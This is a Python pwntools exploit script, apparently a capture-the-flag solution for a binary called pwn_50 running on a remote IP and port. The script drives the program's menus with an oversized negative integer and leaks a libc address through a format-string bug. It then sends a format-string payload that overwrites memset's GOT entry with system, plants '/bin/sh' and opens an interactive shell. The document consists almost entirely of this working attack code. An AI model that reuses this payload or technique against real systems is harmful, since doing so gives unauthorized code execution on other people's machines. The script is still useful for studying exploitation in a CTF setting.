from pwn import *

#p = process("./pwn_50")
p = remote("112.166.114.144",35122)
e = ELF("./pwn_50")
libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")

p.sendline("2")
p.sendline("2")
p.sendline("-2099999999")

p.recv()
p.sendline("")
p.sendline("3")
p.sendline("1")

p.sendline("%10$x") #__isoc99_scanf+11
p.sendline("")
p.sendline("AA")
p.sendline("")
p.sendline("A")
p.sendline("")

p.sendline("4")

p.sendline("AA")
p.recvuntil("again ")
libc_base =  + int(p.recv(8),16) - (libc.symbols["__isoc99_scanf"]+11)

log.info("libc_base : " + hex(libc_base))
#6 7
libc_system = libc_base + libc.symbols["system"]
libc_system_last = hex(libc_system)[6:]
libc_system_first = hex(libc_system)[2:6]

log.success("SYSTEM ADDR : " + hex(libc_system))
log.success("LAST 2 BYTE : " + libc_system_last)
log.success("FIRST 2 BYTE : " + libc_system_first)


payload  = "/bin/sh;;;" 
payload += p32(e.got["memset"]) + p32(e.got["memset"] + 2) 
payload += "%" + str(int(libc_system_last , 16)-4*2 - len("/bin/sh;;;")) + "c"
payload += "%6$hn"
payload += "%"+str(int(libc_system_first,16) - int(libc_system_last,16)) + "c"
payload += "%7$hn"

p.sendline(payload)
p.sendline(payload)
p.sendline("")


p.sendline("5")
p.sendline("2")
p.sendline("-2099999999")
p.sendline("")

p.recv()
p.sendline("")
p.sendline("3")
p.sendline("1")

p.recv()
p.sendline("sh")
p.sendline("")
p.sendline("AA")
p.sendline("")
p.sendline("A")
p.sendline("")

p.sendline("4")

p.sendline("AA")
p.sendline("AA")
p.sendline("AA")

p.interactive()
#print p.recv()